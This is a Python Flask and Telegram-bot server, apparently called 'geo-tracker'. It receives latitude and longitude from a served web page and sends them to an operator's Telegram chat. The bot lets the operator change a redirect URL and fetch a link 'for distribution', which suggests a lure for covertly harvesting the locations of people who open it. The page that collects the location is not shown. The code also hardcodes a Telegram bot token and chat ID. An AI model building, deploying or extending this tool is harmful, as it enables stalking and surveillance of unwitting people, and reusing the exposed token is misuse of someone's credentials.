from flask import Flask, request, send_from_directory
import telebot
import requests
from flask_cors import CORS
import os

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
CORS(app)

redirect_url = 'https://geo-tracker-l5ui.onrender.com'
user_waiting_for_url = set()

def is_authorized(message):
    return message.chat.id == CHAT_ID

def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

@app.route('/')
def serve_index():
    return send_from_directory('static', 'index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        send_to_telegram(lat, lon)
        return {"status": "ok"}
    return {"status": "error"}, 400

@app.route('/redirect')
def get_redirect():
    return {"url": redirect_url}

@app.route('/set_redirect', methods=['POST'])
def set_redirect():
    global redirect_url
    data = request.json
    new_url = data.get("url")
    if new_url and (new_url.startswith("http://") or new_url.startswith("https://")):
        redirect_url = new_url
        return {"status": "ok"}
    return {"status": "error"}, 400

# Webhook route — Telegram будет слать сюда обновления
@app.route('/' + BOT_TOKEN, methods=['POST'])
def webhook():
    json_str = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return '', 200

# --- Бот команды и логика ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_authorized(message):
        return
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('Изменить редирект', 'Скинуть ссылку на мой Render')
    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == 'Изменить редирект' and is_authorized(m))
def ask_redirect(message):
    bot.send_message(message.chat.id, "Пришли новую ссылку для редиректа (начиная с http:// или https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url and is_authorized(m))
def set_redirect_from_message(message):
    url = message.text.strip()
    global redirect_url
    if url.startswith('http://') or url.startswith('https://'):
        redirect_url = url
        bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "❌ Ошибка: ссылка должна начинаться с http:// или https://. Попробуй ещё раз.")

@bot.message_handler(func=lambda m: m.text == 'Скинуть ссылку на мой Render' and is_authorized(m))
def send_render_link(message):
    bot.send_message(message.chat.id, f"Вот твоя ссылка для рассылки:\n{redirect_url}")

if __name__ == '__main__':
    # Перед запуском надо сбросить webhook (если уже был)
    bot.remove_webhook()
    # Указываем telegram, куда слать обновления — обязательно поменяй на свой render-домен
    WEBHOOK_URL = 'https://geo-tracker-l5ui.onrender.com/' + BOT_TOKEN
    bot.set_webhook(url=WEBHOOK_URL)

    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
